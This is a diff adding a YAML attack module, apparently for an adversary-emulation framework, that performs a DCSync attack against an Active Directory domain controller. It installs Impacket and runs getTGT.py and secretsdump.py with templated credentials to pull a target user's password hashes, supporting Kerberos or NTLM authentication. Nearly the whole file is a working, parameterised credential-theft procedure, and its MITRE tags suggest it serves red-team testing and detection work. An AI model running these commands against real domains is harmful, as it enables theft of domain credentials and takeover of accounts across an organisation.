@@ -1,0 +1,68 @@
+---
+api_version: 2.0
+uuid: a4c2e8d1-6f3b-5a9e-8d1c-3e7f2b9a0c4d
+name: DCSync Attack
+authors:
+  - isaac_fletcher
+description: |
+  Performs a DCSync attack to replicate credentials from a Domain Controller.
+  Uses Impacket's secretsdump.py to request replication of a target user's
+  password hashes via the MS-DRSR (Directory Replication Service Remote) protocol.
+requirements:
+  platforms:
+    - os: linux
+    - os: darwin
+mitre:
+  tactics:
+    - TA0006 Credential Access
+  techniques:
+    - T1003 OS Credential Dumping
+  subtechniques:
+    - T1003.006 DCSync
+args:
+  - name: domain
+    description: The target Active Directory domain (e.g., contoso.com)
+    default: contoso.local
+  - name: dc
+    description: The Domain Controller IP or hostname to target
+    default: dc01.contoso.local
+  - name: username
+    description: Username for authentication (without domain prefix)
+  - name: password
+    description: Password for authentication
+  - name: target_user
+    description: The username of the account to dump credentials for (without domain prefix)
+  - name: auth_method
+    description: Authentication method to use (kerberos or ntlm)
+    type: string
+    default: ntlm
+    choices:
+      - kerberos
+      - ntlm
+steps:
+  - name: setup_impacket
+    description: Install impacket
+    ttp: //utils/pip-install/ttp.yaml
+    args:
+      modules: "impacket"
+
+  - name: dcsync
+    description: Perform DCSync to replicate target user credentials
+    inline: |
+      {{ if eq .Args.auth_method "kerberos" }}
+        export KRB5CCNAME=$(pwd)/{{.Args.username}}.ccache
+        getTGT.py "{{.Args.domain}}/{{.Args.username}}:{{.Args.password}}" -dc-ip "{{.Args.dc}}"
+
+        secretsdump.py -k -no-pass -skip-sam -skip-security -debug -ts \
+          -just-dc-user "{{.Args.target_user}}" \
+          -dc-ip "{{.Args.dc}}" \
+          "{{.Args.domain}}/{{.Args.username}}@{{.Args.dc}}"
+
+        rm -f "{{.Args.username}}.ccache"
+      {{ else }}
+        secretsdump.py -skip-sam -skip-security -debug -ts \
+          -just-dc-user "{{.Args.target_user}}" \
+          -dc-ip "{{.Args.dc}}" \
+          "{{.Args.domain}}/{{.Args.username}}:{{.Args.password}}@{{.Args.dc}}"
+      {{ end }}
+    outputvar: DCSYNC_OUTPUT
